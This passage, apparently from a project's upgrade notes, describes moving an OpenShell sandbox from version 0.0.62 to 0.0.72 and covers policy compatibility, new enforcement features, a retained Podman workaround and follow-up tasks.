openshell_reconcile.py, and cli.py. The existing mac-hermes-policy.yaml
template is fully forward-compatible; no policy adjustments are needed.

Key behavior changes in 0.0.72 relative to 0.0.62:
- Native messaging credential rewrite (opt-in via `credential_rewrite` policy
  key; MAC policy has no such key — behavior unchanged).
- WebSocket text-frame and REST body L7 enforcement (tightens `access: read-only`
  endpoints to also block upload POST bodies; MAC's python_packages and
  node_packages blocks now enforce this correctly).
- MCP/JSON-RPC enforcement (opt-in per endpoint; MAC policy uses `protocol: rest`
  throughout — no change).
- `policy get --base` CLI subcommand (informational; MAC uses per-sandbox
  `--policy` injection, not base-policy inheritance — no change).

The 0.0.62 podman-driver mismatch workaround (`mirror_image_for_openshell_runtime`)
is retained in bootstrap-openshell.sh as belt-and-suspenders; the upstream
mismatch is resolved in 0.0.72 but the mirror step is harmless when Podman
is absent.

## Follow-up

- Tune the operator policy against the real model-gateway/hub hosts (both the
  bundled default and the operator template already use
  `landlock: hard_requirement`).
- Replace any remaining production use of `MAC_OPENSHELL_SANDBOX` /
  `MAC_OPENSHELL_GATEWAY` with the supervisor unit.
